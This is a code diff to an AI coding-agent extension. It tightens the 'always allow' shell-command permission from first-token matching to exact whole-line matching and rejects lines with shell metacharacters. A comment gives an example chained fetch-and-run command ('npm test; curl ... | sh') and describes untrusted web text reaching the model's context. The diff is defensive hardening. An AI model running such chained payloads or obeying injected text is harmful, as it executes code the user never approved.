@@ -223,6 +223,40 @@ const UI_DEFAULTS: UiConfigDto = {
   inputWhileRunning: "queue",
 };
 const LOG_RING = 200;
+
+/**
+ * A NEW key, deliberately, so the old grants do not carry over.
+ *
+ * Entries under `genesis.alwaysAllowedCommands` were first tokens - `npm`,
+ * `git` - and each one authorised every command line starting with that word.
+ * Reading them under the new exact-match rule would be harmless (a bare token
+ * almost never equals a whole command line) but it would leave a list of
+ * meaningless rows in the Control Center that nobody could interpret. Starting
+ * clean costs each user re-approving the handful of commands they actually
+ * repeat, and it is the only way to be sure no over-broad grant survives.
+ */
+const ALLOWED_COMMANDS_KEY = "genesis.allowedCommandLines";
+
+/**
+ * Characters that make one command line into several.
+ *
+ * `run_command` executes through a shell, so these are the difference between
+ * "the command on the card" and "the command on the card, and then whatever
+ * else". A line containing any of them can be approved once, on a card that
+ * shows the whole line, but must never become a standing grant.
+ *
+ * Newlines count: a two-line string is two commands to a shell.
+ */
+const SHELL_META = /[;&|<>`\n\r]|\$\(/;
+
+function hasShellMetacharacter(command: string): boolean {
+  return SHELL_META.test(command);
+}
+
+/** One canonical spelling, so whitespace alone cannot defeat or duplicate a grant. */
+function normaliseCommand(command: string): string {
+  return String(command ?? "").trim().replace(/\s+/g, " ");
+}
 const REAL_CONFIG_KEYS = new Set([
   "profileDirectory",
   "skillsDirectory",
@@ -402,10 +436,12 @@ export class App {
       ...(this.context.workspaceState.get<Partial<UiConfigDto>>("genesis.uiConfig") ?? {}),
     };
     this.disabledSkills = this.context.workspaceState.get<string[]>("genesis.disabledSkills", []);
-    this.alwaysAllowedCommands = this.context.workspaceState.get<string[]>(
-      "genesis.alwaysAllowedCommands",
-      []
-    );
+    // Read under the new key only. See ALLOWED_COMMANDS_KEY for why the old
+    // first-token grants are deliberately not carried forward.
+    this.alwaysAllowedCommands = this.context.workspaceState
+      .get<string[]>(ALLOWED_COMMANDS_KEY, [])
+      .map(normaliseCommand)
+      .filter((c) => c && !hasShellMetacharacter(c));
     // Pick the conversation back up where the last window left it.
     this.session.restore();
 
@@ -1159,38 +1195,85 @@ export class App {
     if (files.length) this.broadcast({ type: "attachmentsReady", files });
   }
 
-  async rememberAllowedCommand(token: string): Promise<void> {
-    if (this.alwaysAllowedCommands.includes(token)) return;
-    this.alwaysAllowedCommands = [...this.alwaysAllowedCommands, token];
+  /**
+   * Does a standing grant cover this command?
+   *
+   * EXACT MATCH on the whole normalised command line, and never when the line
+   * contains a shell metacharacter.
+   *
+   * The grant used to be keyed on the command's FIRST TOKEN, which is a word
+   * match standing in for a permission decision about a string that is then
+   * handed to `pexec(..., { shell: true })`. Approving `npm test` once - the
+   * most natural thing anyone does on their first day - permanently authorised
+   * every command whose first word was `npm`, and the shell runs everything
+   * after that word: `npm test; curl https://x/y | sh` matched the grant, ran
+   * with no card, and left nothing in the log to distinguish it. That matters
+   * here more than in most products, because `fetch_url` and the browser tool
+   * put text written by strangers into the model's context by design.
+   *
+   * Exact match is also the honest reading of the button. "Always allow" on a
+   * card showing one command means that command, again, without being asked -
+   * not a family of commands sharing its first word.
+   */
+  commandIsAlwaysAllowed(command: string): boolean {
+    const cmd = normaliseCommand(command);
+    if (!cmd || hasShellMetacharacter(cmd)) return false;
+    return this.alwaysAllowedCommands.includes(cmd);
+  }
+
+  /**
+   * Remember a command so it stops asking.
+   *
+   * Refuses anything carrying a shell metacharacter. A grant is a promise that
+   * what runs next time is what was on the card, and `;` `&&` `|` `$(` and
+   * their relatives are exactly the characters that break that promise - the
+   * card shows one command and the shell runs two. Such a command still runs
+   * this once, having been approved; it just never becomes standing.
+   */
+  async rememberAllowedCommand(command: string): Promise<void> {
+    const cmd = normaliseCommand(command);
+    if (!cmd) return;
+    if (hasShellMetacharacter(cmd)) {
+      this.log(
+        "warn",
+        `Not remembering "${cmd}": it chains or redirects, so a standing grant for it ` +
+          `would not mean what the card said. It ran this once.`
+      );
+      this.broadcast({
+        type: "error",
+        message: "That command was run, but not remembered.",
+        fix:
+          "It contains a shell operator (; && || | > ` $( ), so \"Always allow\" would " +
+          "authorise more than the one command on the card. Approve it each time, or " +
+          "put it in a script and always-allow the script.",
+      });
+      return;
+    }
+    if (this.alwaysAllowedCommands.includes(cmd)) return;
+    this.alwaysAllowedCommands = [...this.alwaysAllowedCommands, cmd];
     await this.context.workspaceState.update(
-      "genesis.alwaysAllowedCommands",
+      ALLOWED_COMMANDS_KEY,
       this.alwaysAllowedCommands
     );
-    this.log("info", `Always allowing shell command: ${token}`);
+    this.log("info", `Always allowing shell command: ${cmd}`);
     // So the Control Center's list is right without waiting for a reload. A
     // grant nobody can see is a grant nobody can take back.
     this.broadcast({ type: "configChanged", config: this.configDto() });
   }
 
-  /**
-   * Take a grant back. An empty token clears all of them.
-   *
-   * The grant is keyed on the command's FIRST TOKEN, which is what makes this
-   * necessary rather than tidy: saying yes to `git status` once authorised
-   * every `git` invocation in the workspace, permanently, and until now there
-   * was no surface on which to discover that or undo it.
-   */
-  async forgetAllowedCommand(token: string): Promise<void> {
+  /** Take a grant back. An empty argument clears all of them. */
+  async forgetAllowedCommand(command: string): Promise<void> {
+    const cmd = normaliseCommand(command);
     const before = this.alwaysAllowedCommands.length;
-    this.alwaysAllowedCommands = token
-      ? this.alwaysAllowedCommands.filter((t) => t !== token)
+    this.alwaysAllowedCommands = cmd
+      ? this.alwaysAllowedCommands.filter((t) => t !== cmd)
       : [];
-    if (this.alwaysAllowedCommands.length === before && token) return;
+    if (this.alwaysAllowedCommands.length === before && cmd) return;
     await this.context.workspaceState.update(
-      "genesis.alwaysAllowedCommands",
+      ALLOWED_COMMANDS_KEY,
       this.alwaysAllowedCommands
     );
-    this.log("info", token ? `No longer always allowing: ${token}` : "Cleared every always-allow grant.");
+    this.log("info", cmd ? `No longer always allowing: ${cmd}` : "Cleared every always-allow grant.");
     this.broadcast({ type: "configChanged", config: this.configDto() });
   }
 
@@ -1803,6 +1886,10 @@ export class App {
 
       case "interrupt":
         this.session.interrupt();
+        return;
+
+      case "stopSession":
+        this.session.stopSession(String(msg.id));
         return;
 
       case "newChat":
